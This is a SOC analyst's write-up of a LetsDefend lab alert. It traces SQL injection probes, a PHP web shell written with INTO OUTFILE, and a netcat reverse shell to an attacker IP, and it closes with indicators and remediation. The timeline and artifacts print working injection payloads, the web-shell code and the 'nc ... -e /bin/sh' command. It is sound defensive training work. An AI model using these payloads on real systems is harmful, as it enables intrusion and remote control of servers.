# SOC142 – Multiple HTTP 500 Response

**Platform:** LetsDefend | **Severity:** High | **Classification:** True Positive | **Date:** April 18, 2021
**Source:** `101.32.223.119` | **Target:** `172.16.20.6` (SQLServer) | **User:** `www-data`

## Summary

An external IP sent a series of SQL injection probes to SQLServer, producing multiple HTTP 500 errors. The attacker then used SQL injection to write a PHP web shell to the server, ran commands through it, and launched a reverse shell back to their own machine. Network logs, firewall logs, and endpoint terminal history all confirm the compromise. SQLServer was contained.

[SCREENSHOT: SOC142 alert expanded on the Monitoring page]

## The Attack

**SQL injection** inserts database commands into input the application passes to its database. Malformed payloads often break the query and cause **HTTP 500** (Internal Server Error) responses, which is what triggered this alert.

**`INTO OUTFILE`** is a SQL feature that writes query results to a file. Here it was abused to write PHP code into the web root, creating a **web shell**: a script that runs any command passed in the URL.

A **reverse shell** makes the compromised server connect out to the attacker and hand over an interactive command line. Because the connection starts from inside the network, it can slip past firewalls that only block inbound traffic.

## Timeline

| Time (log) | Event | Response |
| --- | --- | --- |
| 06:00:10 | `userNumber=-1 UNION SELECT 1 INTO @,@` | 500 |
| 06:00:11 | `userNumber=1 AND (SELECT * FROM Users) = 1` (alerted request) | 500 |
| 06:00:32 | `userNumber=' OR '' = '` | 500 |
| 06:00:43 | `userNumber=AND true` | 500 |
| 06:01:32 | `UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/cmd.php'` | **200** |
| 06:01:59 | `cmd.php?cmd=whoami` | **200** |
| 06:02:23 | `cmd.php?cmd=id` | **200** |
| 06:05:05 | Firewall: SQLServer `172.16.20.6:1774` → `101.32.223.119:1234` | — |
| 06:05:47 | `cmd.php?cmd=nc 101.32.223.119 1234 -e /bin/sh` | — |

*Log Management is 7 hours behind the alert and endpoint time (13:00:27 +03:00). The firewall connection is logged about 40 seconds before the request that launched it, a minor discrepancy between log sources.

## Investigation

### 1. Log Analysis

A search for `101.32.223.119` as the source returned 10 events. Four SQL injection probes returned **500**, matching the alert. The `INTO OUTFILE` request returned **200**, and every following request to `cmd.php` also returned **200**, showing the web shell was created and working.

[SCREENSHOT: Log Management, `Source Address contains "101.32.223.119"`, top of results showing nc, firewall entry, and cmd.php requests]

[SCREENSHOT: Log Management, same search, lower results showing the 500 probes and the INTO OUTFILE request]

### 2. Outbound Connection

A search for `101.32.223.119` as the destination returned two firewall entries from SQLServer port 1774 to the attacker's port 1234. An internal device initiated a connection to the attacker's IP, so the playbook answer is **Accessed**.

[SCREENSHOT: Log Management, `Destination Address contains "101.32.223.119"`, two firewall entries]

### 3. URL Analysis

The destination is the organization's own server, so the base address is legitimate. The request URL is malicious because of the SQL injection payload in the `userNumber` parameter.

### 4. Endpoint Analysis

SQLServer's terminal history confirms the commands executed, matching the network logs minute for minute:

| Endpoint time | Command |
| --- | --- |
| 13:01 | `whoami` |
| 13:02 | `id` |
| 13:05 | `nc 101.32.223.119 1234 -e /bin/sh` |

Two hours later, at 15:01–15:02, `apt show postgresql` and `sudo apt install postgresql postgresql-contrib` ran. These repeat setup commands from 09:13–09:15 that look like normal administration, but because they ran after the reverse shell and used `sudo`, they should be reviewed to rule out attacker activity with elevated privileges.

[SCREENSHOT: Endpoint Security, SQLServer Terminal History, showing Host Contained]

## Artifacts

| Type | Indicator |
| --- | --- |
| Attacker IP | `101.32.223.119` (reverse shell listener on port 1234) |
| SQL Injection URL | `https://172.16.20.6/userNumber=1 AND (SELECT * FROM Users) = 1` |
| Web Shell Write | `https://172.16.20.6/userNumber=' union select 1, '<?php system($_GET['cmd']); ?>' into outfile '/var/www/html/cmd.php' #` |
| Reverse Shell | `https://172.16.20.6/cmd.php?cmd=nc 101.32.223.119 1234 -e /bin/sh` |
| Web Shell File | `/var/www/html/cmd.php` |

## Response and Recommendations

SQLServer was contained, which also cut the reverse shell. Next steps: escalate to incident response, remove `/var/www/html/cmd.php`, review the 15:01–15:02 `sudo` commands and all activity after 13:05, block `101.32.223.119`, fix the injectable `userNumber` parameter with parameterized queries, remove the database account's file-write permission (`FILE` privilege), and patch the OS (Ubuntu 16.04.4).

## Conclusion

**True Positive.** The multiple HTTP 500 responses were SQL injection probes. The attacker then wrote a web shell through SQL injection, executed `whoami` and `id`, and opened a reverse shell from SQLServer to `101.32.223.119`. Network, firewall, and endpoint evidence confirm a full compromise of SQLServer.

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1505.003 (Web Shell), T1033 (System Owner/User Discovery), T1059.004 (Unix Shell)
